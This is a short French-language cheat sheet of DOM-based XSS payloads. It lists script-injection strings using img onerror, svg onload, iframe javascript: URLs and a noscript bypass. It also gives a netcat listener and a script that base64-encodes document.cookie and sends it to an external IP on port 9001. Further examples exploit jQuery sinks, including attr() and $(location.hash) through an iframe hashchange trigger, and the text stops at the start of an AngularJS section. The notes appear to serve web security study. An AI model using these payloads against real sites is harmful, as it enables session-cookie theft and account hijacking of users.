# DOM

```html
<iframe src="javascript:alert(document.domain)">

<img src=x onerror="alert(document.domain)">

"><img src=x onerror=prompt(document.domain);>

#"><img src=/ onerror=alert(document.cookie)>

<svg/onload="alert(document.domain)">

xss">< ! --><svg/onload=alert(document.domain)>

<noscript><p title="</noscript><img src=x onerro=alert(1)>">
```

```html
nc -nlvp 9001


</textarea><script>fetch('http://10.11.86.29:9001?cookie=' + btoa(document.cookie) );</script>
```

## DOM XSS dans jQuery

Si vous utilisez une bibliothèque JavaScript telle que jQuery, soyez attentif aux récepteurs susceptibles de modifier les éléments DOM de la page comme `attr()`.

```html
?returnUrl=javascript:alert(document.domain)
```

Un autre puits potentiel à surveiller est la fonction `$()` de sélection de jQuery, qui peut être utilisée pour injecter des objets malveillants dans le DOM.

similaire à celui-ci :

```js
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
```

Pour exploiter cette vulnérabilité classique, vous devrez trouver un moyen de déclencher un `hashchange` événement sans interaction de l'utilisateur. L'une des méthodes les plus simples consiste à diffuser votre exploit via iframe :

```html
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

## DOM XSS dans AngularJS

Lorsqu'un site utilise l'attribut `ng-app` sur un élément HTML, celui-ci est traité par AngularJS.

Dans ce cas, AngularJS exécute le JavaScript entre des accolades doubles, qui peuvent apparaître directement dans le code HTML ou à l'intérieur des attributs.
